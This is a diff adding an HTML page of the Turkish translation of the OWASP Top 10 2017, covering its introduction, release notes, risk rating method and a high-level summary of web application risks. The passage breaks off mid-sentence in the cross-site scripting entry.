@@ -1,0 +1,1375 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>OWASP Top 10 2017</title>
+  <style>
+    html {
+      line-height: 1.5;
+      font-family: Georgia, serif;
+      font-size: 20px;
+      color: #1a1a1a;
+      background-color: #fdfdfd;
+    }
+    body {
+      margin: 0 auto;
+      max-width: 36em;
+      padding-left: 50px;
+      padding-right: 50px;
+      padding-top: 50px;
+      padding-bottom: 50px;
+      hyphens: auto;
+      overflow-wrap: break-word;
+      text-rendering: optimizeLegibility;
+      font-kerning: normal;
+    }
+    @media (max-width: 600px) {
+      body {
+        font-size: 0.9em;
+        padding: 1em;
+      }
+    }
+    @media print {
+      body {
+        background-color: transparent;
+        color: black;
+        font-size: 12pt;
+      }
+      p, h2, h3 {
+        orphans: 3;
+        widows: 3;
+      }
+      h2, h3, h4 {
+        page-break-after: avoid;
+      }
+    }
+    p {
+      margin: 1em 0;
+    }
+    a {
+      color: #1a1a1a;
+    }
+    a:visited {
+      color: #1a1a1a;
+    }
+    img {
+      max-width: 100%;
+    }
+    h1, h2, h3, h4, h5, h6 {
+      margin-top: 1.4em;
+    }
+    h5, h6 {
+      font-size: 1em;
+      font-style: italic;
+    }
+    h6 {
+      font-weight: normal;
+    }
+    ol, ul {
+      padding-left: 1.7em;
+      margin-top: 1em;
+    }
+    li > ol, li > ul {
+      margin-top: 0;
+    }
+    blockquote {
+      margin: 1em 0 1em 1.7em;
+      padding-left: 1em;
+      border-left: 2px solid #e6e6e6;
+      color: #606060;
+    }
+    code {
+      font-family: Menlo, Monaco, 'Lucida Console', Consolas, monospace;
+      font-size: 85%;
+      margin: 0;
+    }
+    pre {
+      margin: 1em 0;
+      overflow: auto;
+    }
+    pre code {
+      padding: 0;
+      overflow: visible;
+      overflow-wrap: normal;
+    }
+    .sourceCode {
+     background-color: transparent;
+     overflow: visible;
+    }
+    hr {
+      background-color: #1a1a1a;
+      border: none;
+      height: 1px;
+      margin: 1em 0;
+    }
+    table {
+      margin: 1em 0;
+      border-collapse: collapse;
+      width: 100%;
+      overflow-x: auto;
+      display: block;
+      font-variant-numeric: lining-nums tabular-nums;
+    }
+    table caption {
+      margin-bottom: 0.75em;
+    }
+    tbody {
+      margin-top: 0.5em;
+      border-top: 1px solid #1a1a1a;
+      border-bottom: 1px solid #1a1a1a;
+    }
+    th {
+      border-top: 1px solid #1a1a1a;
+      padding: 0.25em 0.5em 0.25em 0.5em;
+    }
+    td {
+      padding: 0.125em 0.5em 0.25em 0.5em;
+    }
+    header {
+      margin-bottom: 4em;
+      text-align: center;
+    }
+    #TOC li {
+      list-style: none;
+    }
+    #TOC a:not(:hover) {
+      text-decoration: none;
+    }
+    code{white-space: pre-wrap;}
+    span.smallcaps{font-variant: small-caps;}
+    span.underline{text-decoration: underline;}
+    div.column{display: inline-block; vertical-align: top; width: 50%;}
+    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+    ul.task-list{list-style: none;}
+    .display.math{display: block; text-align: center; margin: 0.5rem auto;}
+  </style>
+  <!--[if lt IE 9]>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
+  <![endif]-->
+</head>
+<body>
+<header id="title-block-header">
+<h1 class="title">OWASP Top 10 2017</h1>
+</header>
+<p><img src="images/OWASP_logo.png" alt="OWASP LOGO" /></p>
+<h2 id="owasp-top-10-2017">OWASP Top 10 2017</h2>
+<p>En Tehlikeli 10 Web Uygulaması Güvenlik Açıklıkları</p>
+<p>20 Kasım 2017</p>
+<h3 id="sürüm">Sürüm</h3>
+<p>Talimatlara uygun yorumlar talep edilmiştir</p>
+<p><img src="images/front-wasp.png" alt="WASP Logo URL TBA" /></p>
+<table>
+<thead>
+<tr class="header">
+<th></th>
+<th><img src="images/front-cc.png" alt="Creative Commons License Logo" /></th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td><a href="https://owasp.org">https://owasp.org</a></td>
+<td>Bu çalışma Creative Commons Attribution-ShareAlike 4.0 International lisansı kapsamında oluşturulmuştur.</td>
+</tr>
+</tbody>
+</table>
+<h1 id="sürüm-1">Sürüm</h1>
+<h2 id="önemli-hatırlatma">Önemli Hatırlatma</h2>
+<h3 id="yorum-talebi">Yorum Talebi</h3>
+<p>OWASP İlk 10'un metin hali olan bu kısım, çevirmenler ve metin haliyle ilgilenenler için kullanışlı olmasına rağmen, resmi sürüm olmayıp, resmi sürüm PowerPoint / PDF halidir.</p>
+<p>Bu aşamada, aşağıdaki konularda yardım talep etmekteyiz:</p>
+<ul>
+<li>Çeviriler - bazı takımlar üzerinde çalışmakta, ancak yardım edebileceğinizi düşünüyorsanız bize ulaşın</li>
+</ul>
+<p>Tüm sorun ve düzeltmelerin Github üzerinden kayıt altına alınmasına son derece özen gösteriyoruz:</p>
+<ul>
+<li><a href="https://github.com/OWASP/Top10/issues"><a href="https://github.com/OWASP/Top10/issues">https://github.com/OWASP/Top10/issues</a></a></li>
+</ul>
+<p>Herkese açık bir şeffaflık ile, izlenebilirlik sağlıyoruz ve yayımdan önceki bu son ayda tüm yorumların duyulmasını sağlıyoruz.</p>
+<ul>
+<li>Andrew van der Stock</li>
+<li>Brian Glas</li>
+<li>Neil Smithline</li>
+<li>Torsten Gigler</li>
+</ul>
+<h1 id="i̇çi̇ndeki̇ler">İÇİNDEKİLER</h1>
+<p>&lt; içindekiler tablosu ile değiştiriniz &gt;</p>
+<h1 id="o-owasp-hakkında">O OWASP Hakkında</h1>
+<h2 id="owasp-hakkında">OWASP Hakkında</h2>
+<p>Open Web Application Security Project (OWASP), kendisini kurumların güvenilebilir uygulamalar ve API’ler geliştirmesini, satın almasını ve sürdürmesini sağlamaya adamış açık bir topluluktur.</p>
+<p>OWASP ile, aşağıdakileri açık ve ücretsiz bir şekilde temin edebilirsiniz:</p>
+<ul>
+<li>Uygulama güvenliği araçları ve standartları</li>
+<li>Uygulama güvenlik testleri, güvenli kod geliştirme ve güvenli kod analizi hakkında eksiksiz kitaplar.</li>
+<li>Sunumlar ve <a href="https://www.youtube.com/user/OWASPGLOBAL">videolar</a>.</li>
+<li>Yaygın pek çok konu hakkında <a href="https://cheatsheetseries.owasp.org/">kopya kağıtları</a></li>
+<li>Standart güvenlik kontrolleri ve kütüphaneleri.</li>
+<li><a href="https://owasp.org/chapters/">Dünya çapında yerel topluluklar</a>.</li>
+<li>İleri düzey ve son teknoloji araştırma.</li>
+<li>Dünya çapında geniş kapsamlı <a href="https://owasp.org/events/">konferanslar</a>.</li>
+<li><a href="https://lists.owasp.org/mailman/listinfo">E-posta listeleri</a>.</li>
+</ul>
+<p>Daha fazla bilgi için: <a href="https://owasp.org"><a href="https://owasp.org">https://owasp.org</a></a>.</p>
+<p>Tüm OWASP araçları, belgeleri, videoları, sunumları ve toplulukları uygulama güvenliği alanında kendisini geliştirmek isteyen herkese açık ve ücretsizdir.</p>
+<p>Uygulama güvenliğini insanlar, süreçler ve teknoloji arasındaki bir problem olarak gören yaklaşımı destekliyoruz, çünkü uygulama güvenliğine karşı en etkili yaklaşımlar bu alanlarda gelişimi gerektirmektedir.</p>
+<p>OWASP yeni bir tür organizasyondur. Ticari baskılara karşı özgürlüğümüz uygulama güvenliği hakkında tarafsız, uygulanabilir ve maliyeti az bilgiler sağlamamıza izin vermektedir.</p>
+<p>Ticari güvenlik teknolojilerinin bilinçli kullanımını destekliyor olsak da, OWASP herhangi bir teknoloji kuruluşu ile ilişkili değildir. OWASP işbirlikçi, şeffaf ve açık bir şekilde pek çok farklı kaynak üretmektedir.</p>
+<p>OWASP projenin uzun vadeli başarısını sağlayan kar amacı gütmeyen bir varlıktır. OWASP kurulu, topluluk liderleri, proje liderleri ve proje üyeleri dahil OWASP ile ilişkili neredeyse herkes gönüllülerdir. Ödenekler ve alt yapı aracılığıyla yenilikçi güvenlik araştırmalarını destekliyoruz.</p>
+<p>Bize katılın!</p>
+<h2 id="telif-hakkı-ve-lisans">Telif Hakkı ve Lisans</h2>
+<p><img src="images/license.png" alt="license" /></p>
+<p>Copyright © 2003-2021 The OWASP Foundation. Bu doküman Creative Commons Attribution Share-Alike 4.0 lisansı kapsamında yayınlanmıştır. Herhangi bir tekrar kullanım veya dağıtım için, bu çalışmanın lisans şartlarını belirtmeniz gerekmektedir.</p>
+<h2 id="önsöz">Önsöz</h2>
+<p>Güvenli olmayan yazılımlar finans, sağlık, savunma, enerji ve diğer kritik alt yapılarımıza zarar vermektedir. Yazılımlarımız karmaşık ve bağlantılı oldukça, uygulama güvenliğini sağlamak da katlanarak zorlaşmaktadır. Modern yazılım geliştirme süreçlerinin yüksek hızı, en yaygın risklerin tespiti ile hızlı ve doğru bir şekilde kaldırılmasını kaçınılmaz kılmaktadır. Artık, bu OWASP İlk 10 çalışmasında sunulanlar gibi basit güvenlik problemlerine müsamaha gösterilmesi imkansızdır.</p>
+<p>OWASP İlk 10 -2017 hazırlanırken, benzer diğer OWASP çalışmalarına kıyasla büyük oranda geri bildirim alınmıştır. Bu durum, topluluğun OWASP İlk 10 için tutkusunu göstermektedir. Bu yüzden de, İlk 10’un kullanım örneklerinin çoğunu kapsayacak şekilde eksiksiz olarak yapılmasının OWASP için ne kadar önemli olduğunu göstermektedir.</p>
+<p>OWASP İlk 10 çalışmasının asıl amacı geliştiriciler ve yöneticiler arasında farkındalık oluşturmak olsa da, bir uygulama güvenliği standardı haline gelmiştir.</p>
+<p>Bu sürümde, uygulama güvenliği programlarında OWASP İlk 10’un benimsenmesine yardımcı olmak için sorunlar ve çözüm önerileri kısa ve test edilebilir bir şekilde yazılmıştır. Gerçek bir standart gerekiyorsa, büyük kuruluşlara <a href="https://owasp.org/www-project-application-security-verification-standard/">OWASP Uygulama Güvenliği Doğrulama Standardı'nı (ASVS)</a> kullanmalarını öneriyoruz, ancak çoğu kurum için OWASP İlk 10 uygulama güvenliği alanında önemli bir başlangıç olacaktır.</p>
+<p>"Geliştiriciler için Bir Sonraki Adım", "Güvenlik Testi Ekipleri için Bir Sonraki Adım", CIO ve CISO’lar için uygun olan "Kurumlar için Bir Sonraki Adım" ve uygulama yöneticileri veya uygulama yaşam döngüsünden sorumlu olan kişiler için uygun olan "Uygulama Yöneticileri için Bir Sonraki Adım" kısımları dahil OWASP İlk 10’un farklı kullanıcıları için bir takım tavsiye edilen sonraki adım bölümleri yazılmıştır.</p>
+<p>Uzun vadede, tüm yazılım geliştirme takımlarına ve kurumlara kendi kültür ve teknolojileri ile uyumlu bir uygulama güvenliği programı oluşturmalarını tavsiye ediyoruz. Bu programlar sayı olarak çok fazla ve birbirlerinden çok farklı olabilir. Yazılım Garanti Olgunluk Modeli’ni kullanarak, organizasyonunuzun güçlü yanlarını uygulama güvenliği programınızı değerlendirmek ve geliştirmek için kullanınız.</p>
+<p>OWASP İlk 10 çalışmasının uygulama güvenliği için yapacağınız çalışmalarda kullanışlı olmasını umuyoruz. Sorularınız, yorumlarınız ve düşünceleriniz için aşağıdaki Github projesi üzerinden OWASP ile iletişime geçebilirsiniz:</p>
+<ul>
+<li><a href="https://github.com/OWASP/Top10/issues"><a href="https://github.com/OWASP/Top10/issues">https://github.com/OWASP/Top10/issues</a></a></li>
+</ul>
+<p>OWASP İlk 10 projesine ve çevirilerine aşağıdaki link üzerinden erişebilirsiniz:</p>
+<ul>
+<li><a href="https://owasp.org/www-project-top-ten/"><a href="https://owasp.org/www-project-top-ten/">https://owasp.org/www-project-top-ten/</a></a></li>
+</ul>
+<p>Son olarak, OWASP İlk 10 projesinin kurucu liderleri olan Dave Wichers ve Jeff Williams’a tüm topluluğun yardımıyla bu projeyi bitirme konusunda bize olan inançları ve tüm çabaları için teşekkür etmek istiyoruz. Teşekkürler!</p>
+<ul>
+<li>Andrew van der Stock</li>
+<li>Brian Glas</li>
+<li>Neil Smithline</li>
+<li>Torsten Gigler</li>
+</ul>
+<h2 id="teşekkürler">Teşekkürler</h2>
+<p><a href="https://www.autodesk.com">Autodesk</a>'e OWASP İlk 10 -2017 projesine sponsor oldukları için teşekkürler. Açıklıklara ait yaygınlık bilgilerini veya diğer yardımları sağlayan kurumlar ve kişiler <a href="0xd1-data-contributors.md">Teşekkürler sayfasında</a> listelenmiştir.</p>
+<h1 id="i-giriş">I Giriş</h1>
+<h2 id="owasp-i̇lk-10---2017-projesine-hoş-geldiniz">OWASP İlk 10 - 2017 Projesine Hoş Geldiniz</h2>
+<p>Bu güncelleme ikisi topluluk tarafından seçilen A8:2017-Güvensiz Ters Serileştirme ve A10:2017-Yetersiz Loglama ve İzleme gibi bazı yeni açıklıklar eklemektedir. Daha önceki OWASP İlk 10 sürümleri ile iki ana farklılığı; büyük ölçüde topluluk geri bildirimi, muhtemelen herhangi bir uygulama güvenliği standardı hazırlanırken toplanılan veri miktarından daha fazla olan ve düzinelerce kurumdan toplanan geniş kapsamlı verilerdir. Bu durum, yeni OWASP İlk 10 açıklıklarının kurumların karşılaştıkları en riskli uygulama güvenliği zafiyetlerini içerdiği konusunda teminat vermektedir.</p>
+<p>OWASP İlk 10 2017, temel olarak uygulama güvenliği alanında uzmanlaşmış kırkdan fazla firmadan gelen verilere ve 500'den fazla kişinin katıldığı bir endüstri anketine dayanmaktadır. Bu veriler yüzlerce firmadan, 100.000 gerçek uygulama ve API'den toplanan açıklıkları kapsamaktadır. İlk 10 açıklıkları istismar edilebilirliği, tespit edilebilirliği ve etkisi hakkındaki genel tahminler ile beraber zafiyet yaygınlık verilerine göre seçilmiş ve sıralanmıştır.</p>
+<p>OWASP İlk 10'un temel amacı, en yaygın ve en önemli web uygulama güvenlik zayıflıklarının sonuçları hakkında geliştiricileri, tasarımcıları, sistem mimarlarını, yöneticileri ve organizasyonları eğitmektir. İlk 10 projesi bu yüksek risk içeren sorunlara karşı basit korunma yöntemleri ve bundan sonraki adımların ne olacağı hakkında bir rehber sağlamaktadır.</p>
+<h2 id="gelecek-faaliyetler-için-yol-haritası">Gelecek faaliyetler için yol haritası</h2>
+<p><strong>10 ile sınırlı kalmayın</strong>. <a href="https://github.com/OWASP/DevGuide">OWASP Geliştiri Rehberi</a> ve <a href="https://cheatsheetseries.owasp.org/">OWASP Kopya Kağıtları'nda</a> bahsedildiği gibi, bir web uygulamasının güvenliğini etkileyebilecek yüzlerce sorun bulunmaktadır. Bu dokümanlar web uygulaması ve API geliştiren herkes için önemli bir kaynaktır. Web uygulamalarında ve API'lerde açıklıkların bulunmasına ilişkin rehber <a href="https://owasp.org/www-project-web-security-testing-guide/">OWASP Test Rehberi</a> projesinde sağlanmıştır.</p>
+<p><strong>Sürekli değişim</strong>. OWASP İlk 10 sıralaması değişmeye devam edecektir. Uygulamanızda tek bir satır kod değiştirmeseniz bile, yeni açıklıklar bulunduğu ve saldırı yöntemleri yenilendiği için açıklıklara karşı korumasız kalabilirsiniz. Lütfen daha fazla bilgi için İlk 10 projesinin sonunda yer alan Geliştiriciler, Güvenlik Testi Ekipleri, Kurumlar ve Uygulama Yöneticileri için Bir Sonraki Adım bölümlerini gözden geçiriniz.</p>
+<p><strong>Olumlu düşünme</strong>. Açıklıkların peşinden koşmayı bırakmaya ve daha güçlü uygulama güvenliği kontrolleri oluşturmaya hazır olduğunuzda, <a href="https://owasp.org/www-project-proactive-controls/">OWASP Proaktif Kontroller</a> projesi geliştiricilerin güvenli uygulama geliştirme konusunda bir başlangıç noktası olmakta ve <a href="https://owasp.org/www-project-application-security-verification-standard/">OWASP Uygulama Güvenliği Doğrulama Standardı (ASVS)</a> ise kurumlar ve uygulama testi ekipleri için kontrol edecekleri maddeleri içeren bir rehber olmaktadır.</p>
+<p><strong>Araçları akıllıca kullanma</strong>. Güvenlik açıklıkları son derece karmaşık olabilmekte ve kod içerisinde derinlerde bulunabilmektedir. Çoğu durumda, bu açıklıkları bulmak ve ortadan kaldırmak için en etkili yaklaşım gelişmiş araçları kullanan uzmanlardır. Sadece araçlara bağlı kalmak güvenliği yanlış anlamaktır ve tavsiye edilmemektedir.</p>
+<p><strong>Her yöne yaygınlaştırma</strong>. Kurumunuzda güvenliği kurum kültürünün tamamlayıcı bir parçası yapmaya odaklanın. <a href="https://owasp.org/www-project-samm/">OWASP Yazılım Garanti Olgunluk Modeli (SAMM)</a> üzerinden daha fazla bilgi edinebilirsiniz.</p>
+<h2 id="teşekkürler-1">Teşekkürler</h2>
+<p>Kurumlara 2017 güncellemesi için sağladıkları açıklık verileri için teşekkür ederiz. Veri talebine 40'dan fazla cevap aldık. İlk kez, İlk 10 sürümüne katkı olarak sağlanan tüm veriler ve katkı sağlayanların tam listesi açık bir şekilde yayınlanmıştır. Bunun şimdiye kadar toplanan en büyük ve en kapsamlı açıklık veri setlerinden birisi olduğuna inanıyoruz.</p>
+<p>Katkı sağlayan herkesi sıralayacak kadar geniş bir yer olmadığı için, yapılan katkılara teşekkür etmek için ayrı bir sayfa oluşturduk. Açıklık verilerini paylaşma noktasında istekli bir şekilde en ön safta oldukları için bu kurumlara gönülden teşekkürlerimizi sunuyoruz. Bu çalışmanın daha da büyümesini ve daha fazla kurumu teşvik etmesini ve böylelikle de kanıta dayalı güvenlik yaklaşımının önemli kilometre taşlarından birisi olmasını ümit ediyoruz. OWASP İlk 10 bu inanılmaz katkılar olmasaydı ortaya çıkamazdı.</p>
+<p>Endüstri anketini tamamlamak için vakit ayıran 500'den fazla kişiye de ayrıca teşekkür ediyoruz. Yorumlarınız İlk 10 sıralamasına iki yeni eklemenin yapılmasına yardımcı oldu. İlave yorumlarınız, teşvikleriniz ve eleştirileriniz için de ayrıca teşekkür ederiz. Ayırdığınız kıymetli zamanınız için tekrar teşekkür etmek istiyoruz.</p>
+<p>Önemli yapıcı eleştiriler ve İlk 10 sıralamasına yapılan bu güncellemeyi gözden geçirmek için zaman ayıran kişilere de teşekkür etmek istiyoruz. Olabildiğince bu kişileri "Teşekkürler" sayfasında listelemeye çalıştık.</p>
+<p>Ve son olarak, İlk 10 projesini farklı dillere çevirerek OWASP İlk 10'un tüm dünyada erişilebilir hale gelmesine yardımcı olacak tüm çevirmenlere şimdiden teşekkür ederiz.</p>
+<h1 id="rn-sürüm-notları">RN Sürüm Notları</h1>
+<h2 id="2013ten-2017ye-neler-değişti">2013'ten 2017'ye Neler Değişti?</h2>
+<p>Son dört yıl içerisinde her alanda hızlanan değişim, OWASP İlk 10 projesinin de değiştirilmesi ihtiyacını doğurdu. OWASP İlk 10 projesi yeniden düzenlendi, metodoloji yenilendi, yeni bir veri talebi süreci oluşturuldu, topluluk ile beraber çalışıldı, her bir risk baştan aşağı tekrar yazıldı, riskler tekrar sıralandı ve yaygın olarak kullanılan diller ve kütüphaneler için referanslar eklendi.</p>
+<p>Son birkaç yıl içerisinde, uygulamaların sahip olduğu temel teknolojiler ve mimari büyük ölçüde değişti.</p>
+<ul>
+<li>Node.js ve Spring Boot ile yazılan mikroservisler geleneksel monolitik uygulamaların yerini almaktadır. Mikroservisler -mikroservisler arasındaki güven, konteynerler, gizli bilgilerin yönetimi gibi- kendilerine özgü pek çok güvenlik sorununu da beraberinde getirmektedir. Eskiden, internet üzerinden erişilebilmesine ihtimal verilmeyen kodlar, şimdi Tek Sayfa Uygulamalar ve mobil uygulamalar tarafından tüketilmek üzere bir API veya REST servisi arkasında bulunmaktadır. Güvenilir servis tüketicileri gibi mimarisel varsayımlar artık geçerli olmamaktadır.</li>
+<li>Angular ve React gibi JavaScript kütüphaneleri ile yazılan tek sayfa uygulamalar, son derece modüler ve sahip olduğu özellikler bakımından zengin ön uçların(front end) oluşturulmasına izin vermektedir. Geleneksel olarak sunucu tarafında sağlanan işlevlerin istemci tarafına taşınması çeşitli güvenlik sorunlarını da beraberinde getirmektedir.</li>
+<li>Sunucu tarafında çalışan Node.js ve istemci tarafında çalışan Bootstrap, Electron, Angular ve React gibi modern web kütüphaneleri ile JavaScript artık web uygulamalarının birincil programlama dili olmuştur.</li>
+</ul>
+<h2 id="verilerle-desteklenen-yeni-açıklıklar">Verilerle desteklenen yeni açıklıklar</h2>
+<ul>
+<li><strong>A4:2017-XML Dış Varlıkları (XXE)</strong> yaygın olarak kaynak kod analizi gerçekleştiren araçların(<a href="https://owasp.org/www-community/Source_Code_Analysis_Tools">SAST</a>) veri setleri tarafından desteklenen yeni bir kategoridir.</li>
+</ul>
+<h2 id="topluluk-tarafından-desteklenen-yeni-açıklıklar">Topluluk tarafından desteklenen yeni açıklıklar</h2>
+<p>Aşağıdaki iki açıklık kategorisi hakkında görüşlerini almak için topluluğa danıştık. 500'den fazla cevap değerlendirildikten sonra, bu açıklıklar İlk 10'a eklenmiştir;</p>
+<ul>
+<li><strong>A8:2017-Güvensiz Ters İşleme</strong>, etkilenen platformlar üzerinde uzaktan kod çalıştırılmasına veya hassas nesnelerin değiştirilmesine izin vermektedir.</li>
+<li><strong>A10:2017-Yetersiz Loglama ve İzleme</strong>, eksikliği zararlı aktivitelerin ve ihlallerin tespitini, olay müdahalesini ve dijital adli bilişimi engelleyebilmekte veya önemli düzeyde geciktirebilmektedir.</li>
+</ul>
+<h2 id="unutulmamış-ancak-birleştirilmiş-veya-kaldırılmış-açıklıklar">Unutulmamış ancak birleştirilmiş veya kaldırılmış açıklıklar</h2>
+<ul>
+<li><strong>A4-Güvensiz Doğrudan Nesne Başvuruları</strong> ve <strong>A7-Fonksiyon Düzeyinde Erişim Kontrolünün Olmaması</strong>, <strong>A5:2017-Yetersiz Erişim Kontrolü</strong> başlığı altında birleştirilmiştir.</li>
+<li><strong>A8-Siteler Arası İstek Sahteciliği (CSRF)</strong>, pek çok çerçeve <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html">CSRF savunması</a> içerdiği için sadece uygulamaların %5'inde bulunmuştur.</li>
+<li><strong>A10-Doğrulanmamış Yönlendirme ve İletmeler</strong>, uygulamaların %8'inde bulunmasına rağmen, XXE tarafından liste dışı bırakılmıştır.</li>
+</ul>
+<p><img src="images/0x06-release-notes-1.png" alt="0x06-release-notes-1" /></p>
+<h1 id="risk---uygulama-güvenliği-riskleri">Risk - Uygulama Güvenliği Riskleri</h1>
+<h2 id="uygulama-güvenliği-riskleri-nelerdir">Uygulama Güvenliği Riskleri Nelerdir?</h2>
+<p>Saldırganlar işinize veya kurumunuza zarar vermek için uygulamanız üzerinden farklı yollar deneyebilirler. Bu farklı yolların her biri dikkat etmeyi gerektirecek kadar ciddi olabilecek veya olamayacak bir risk oluşturmaktadır.</p>
+<p><img src="images/0x10-risk-1.png" alt="App Security Risks" /></p>
+<p>Bazen bu yolların bulunması ve istismar edilmesi kolay olurken, bazen de son derece zor olabilmektedir. Benzer bir şekilde, oluşacak zarar da hiçbir öneme sahip olamayacağı gibi işinizi tehlikeye atabilecek boyutta da olabilmektedir. Kurumunuz için riskleri belirlerken, her bir tehdit etkeni ile ilişkilendirilen olasılığı, saldırı vektörünü ve güvenlik açığını değerlendirebilir ve bunu kurumunuzun üzerinde bırakmasını beklediğiniz teknik ve iş etkileri ile birleştirebilirsiniz.</p>
+<h2 id="risklerim-neler">Risklerim Neler</h2>
+<p><a href="https://owasp.org/www-project-top-ten/">OWASP İlk 10</a> farklı kurumlar için en ciddi web uygulaması güvenlik risklerini belirlemeye çalışmaktadır. Bu risklerin her biri için, OWASP Risk Derecelendirme Metadolojisi'ne dayanan aşağıdaki basit derecelendirme şemasını kullanarak olasılığı ve teknik etkisi hakkında genel bilgi sağlamaktayız.</p>
+<table>
+<thead>
+<tr class="header">
+<th>Tehdit Etkenleri</th>
+<th>İstismar Edilebilirlik</th>
+<th>Zafiyetin Yaygınlığı</th>
+<th>Tespit Edilebilirlik</th>
+<th>Teknik Etkiler</th>
+<th>İş Etkileri</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>Uygu-</td>
+<td>Kolay 3</td>
+<td>Çok yaygın 3</td>
+<td>Kolay 3</td>
+<td>Ciddi 3</td>
+<td>İş</td>
+</tr>
+<tr class="even">
+<td>lama</td>
+<td>Orta 2</td>
+<td>Yaygın 2</td>
+<td>Orta 2</td>
+<td>Orta 2</td>
+<td>Özel</td>
+</tr>
+<tr class="odd">
+<td>özelinde</td>
+<td>Zor 1</td>
+<td>Nadir 1</td>
+<td>Zor 1</td>
+<td>Önemsiz 1</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>Bu sürümde, riskler için etki ve olasılık hesaplamasında yardımcı olması adına risk derecelendirme sistemini güncelledik. Daha fazla detay için, lütfen <a href="0xc0-note-about-risks.md">Riskler Hakkında Notlar</a> kısmına bakınız.</p>
+<p>Her kurum birbirinden farklıdır ve bunun sonucu olarak kurum için mevcut tehdit etkenleri, bunların amaçları ve herhangi bir ihlal durumunda etkileri de farklıdır. Kamu yararına hitap eden bir kurum ile hassas sağlık kayıtları içeren bir sağlık sistemi aynı içerik yönetim sistemini (CMS) kullansa bile, tehdit etkenleri ve iş etkileri aynı yazılım için birbirinden son derece farklı olacaktır. Bu yüzden, kurumunuz için var olan riskleri, uygulanabilir tehdit etkenlerini ve iş etkilerini göz önünde bulundurarak anlamanız büyük önem taşımaktadır.</p>
+<p>Mümkün olabildiğince, İlk 10 içerisinde yer alan riskler, karmaşıklığı azaltmak ve genel olarak kabul görmüş adlandırma kurallarını teşvik etmek için <a href="https://cwe.mitre.org/">Common Weakness Enumeration</a> (CWE) içerisinde yer alan açıklıklar ile benzer şekilde isimlendirilmiştir.</p>
+<h2 id="kaynaklar">Kaynaklar</h2>
+<h3 id="owasp">OWASP</h3>
+<ul>
+<li><a href="https://owasp.org/www-community/OWASP_Risk_Rating_Methodology">OWASP Risk Derecelendirme Metadolojisi</a></li>
+<li><a href="https://owasp.org/www-community/Threat_Modeling">Tehdit/Risk Modelleme hakkında bir makale</a></li>
+</ul>
+<h3 id="dış-kaynaklar">Dış Kaynaklar</h3>
+<ul>
+<li><a href="https://www.iso.org/iso-31000-risk-management.html">ISO 31000: Risk Yönetimi Standardı</a></li>
+<li><a href="https://www.iso.org/isoiec-27001-information-security.html">ISO 27001: ISMS</a></li>
+<li><a href="https://www.nist.gov/cyberframework">NIST Cyber Framework (US)</a></li>
+<li><a href="https://www.cyber.gov.au/acsc/view-all-content/publications/strategies-mitigate-cyber-security-incidents">ASD Strategic Mitigations (AU)</a></li>
+<li><a href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator">NIST CVSS 3.0</a></li>
+<li><a href="https://www.microsoft.com/en-us/download/details.aspx?id=49168">Microsoft Tehdit Modelleme Aracı</a></li>
+</ul>
+<h1 id="t10-en-tehlikeli-10-uygulama-güvenliği-açıklıkları--2017">T10 En Tehlikeli 10 Uygulama Güvenliği Açıklıkları – 2017</h1>
+<p>| Açıklık | Açıklama | | -- | -- | | A1:2017-Enjeksiyon | SQL, NoSQL, OS ve LDAP enjeksiyonu gibi enjeksiyon açıklıkları, güvenilir olmayan verinin bir komut veya sorgunun parçası olarak bir yorumlayıcıya gönderilmesiyle ortaya çıkmaktadır. Saldırganın zararlı girdisi, yorumlayıcının istenilmeyen komutları çalıştırmasına veya yetki denetimi olmadan verilere yetkisiz erişime neden olabilmektedir. | | A2:2017-Yetersiz Kimlik Doğrulama | Kimlik doğrulama ile ilgili uygulama fonksiyonları ve oturum yönetimi, genelde hatalı bir şekilde uygulanmaktadır. Bu durum saldırganların parolaları, anahtarları veya oturum anahtarlarını ele geçirmesine veya başka bir uygulama hatasını kullanarak başka kullanıcıların kimliklerini geçici veya kalıcı olarak üstlenebilmelerine izin vermektedir. | | A3:2017-Hassas Bilgi İfşası | Pek çok web uygulaması ve API finans, sağlık ve PII gibi hassas bilgileri yeterli bir şekilde koruyamamaktadır. Saldırganlar bu tür korunmasız bigileri ele geçirerek veya değiştirerek kredi kartı sahteciliği ve kimlik sahteciliği suçlarını veya diğer benzer suçları gerçekleştirebilmektedir. Hassas bilgiler şifreleme gibi ilave koruma önlemleri olmadığında ele geçirilebilmekte ve tarayıcıya gönderilirken veya tarayıcıdan alınırken özel güvenlik tedbirleri gerektirmektedir. | | A4:2017-XML Dış Varlıkları (XXE) | Pek çok eski veya hatalı yapılandırmaya sahip XML işlemcileri XML dokümanları içerisinde yer alan dış varlık başvurularını değerlendirmektedir. Dış varlıklar dosya URI işleyicisi kullanılarak sunucu içinde yer alan dosyaların ifşası, iç dosya paylaşımları, iç port taramaları, uzaktan kod çalıştırma ve servis dışı bırakma saldırıları için kullanılabilmektedir. | | A5:2017-Yetersiz Erişim Kontrolü | Kimlik doğrulaması yapılmış kullanıcıların yapabilecekleri işlemler üzerindeki kısıtlamalar genellikle doğru bir şekilde uygulanmamaktadır. Saldırganlar bu açıklıkları istismar ederek diğer kullanıcıların hesaplarına erişmek, hassas dosyaları görüntülemek, diğer kullanıcı verilerini değiştirmek, erişim haklarını değiştirmek gibi yetkisiz işlemler yapabilmekte ve/veya görmemesi gereken verileri görüntüleyebilmektedir. | | A6:2017-Hatalı Güvenlik Yapılandırması | Hatalı güvenlik yapılandırması en yaygın görülen sorundur. Bu genellikle güvenli olmayan varsayılan yapılandırmanın, eksik veya özel amaçlı yapılandırmanın, açık bulut depolama alanının, yanlış yapılandırılmış HTTP başlıklarının ve hassas bilgi içeren detaylı hata mesajlarının bir sonucudur. Tüm işletim sistemleri, kütüphaneler ve uygulamalar güvenli bir şekilde yapılandırılmalı ve aynı zamanda düzenli bir şekilde güncellenmeli/yamaları yüklenmelidir. | | A7:2017-Siteler Arası Betik Çalıştırma (XSS) | XSS açıklıkları, uygulama düzgün bir doğrulama veya 